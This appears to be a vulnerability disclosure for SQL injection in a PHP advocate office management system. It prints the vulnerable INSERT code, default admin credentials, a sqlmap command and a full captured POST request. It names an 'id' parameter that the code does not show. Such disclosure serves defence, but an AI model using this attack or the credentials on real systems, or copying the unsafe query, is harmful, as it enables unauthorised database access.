# Kortex Lite Advocate Office Manage System

### SQL Injection on `/control/adds.php`

### Vendor Homepage:

```
https://www.sourcecodester.com/php/17280/advocate-office-management-system-free-download.html
```

### Version:

```
v1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://127.0.0.1/kortex_lite/control/login.php
mayuri.infospace@gmail.com
admin
```

### Affected Page:

```
/control/adds.php
```

In this scenario, the value of user input (the **`id`** parameter) is directly concatenated into an SQL query without undergoing any form of filtering or utilizing prepared statements, causing the application vulnerable to SQL injection attack

```php
77:   if(isset($_POST['submit'])){    
78:   $name = $_POST['name'];
79:   $gender= $_POST['gender'];
80:   $dob= $_POST['dob'];
81:   $email = $_POST['email'];
82:   $mobile = $_POST['mobile'];
83:   $address= $_POST['address'];
84: 
85:
86:   $sql = "INSERT INTO clients(name,gender,dob,email,mobile,address)
87:   VALUES ('$name','$gender','$dob','$email','$mobile','$address')";
```

### Proof of Concept:

Payload:

```jsx
sqlmap -r request.txt --current-user --batch --dbms mysql
```

Burp Request:

```jsx
POST /kortex_lite/control/adds.php HTTP/1.1
Host: 192.168.183.132
Content-Length: 717
Cache-Control: max-age=0
sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6TRKcsxel6FQvi9q
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/kortex_lite/control/adds.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ihtlup31vclhigou4q6if7fl1u
Connection: close

------WebKitFormBoundary6TRKcsxel6FQvi9q
Content-Disposition: form-data; name="name"

123
------WebKitFormBoundary6TRKcsxel6FQvi9q
Content-Disposition: form-data; name="gender"

Male
------WebKitFormBoundary6TRKcsxel6FQvi9q
Content-Disposition: form-data; name="dob"

123
------WebKitFormBoundary6TRKcsxel6FQvi9q
Content-Disposition: form-data; name="email"

123@123.com
------WebKitFormBoundary6TRKcsxel6FQvi9q
Content-Disposition: form-data; name="mobile"

123
------WebKitFormBoundary6TRKcsxel6FQvi9q
Content-Disposition: form-data; name="address"

123
------WebKitFormBoundary6TRKcsxel6FQvi9q
Content-Disposition: form-data; name="submit"

------WebKitFormBoundary6TRKcsxel6FQvi9q--
```

### Screenshot
![image](https://github.com/zyairelai/CVE-submissions/assets/49854907/a3f20e08-1e22-4c8e-945a-8d6e6e2f197e)
![image](https://github.com/zyairelai/CVE-submissions/assets/49854907/f64c5b17-fd2c-457d-bdcd-61ac9258db2e)
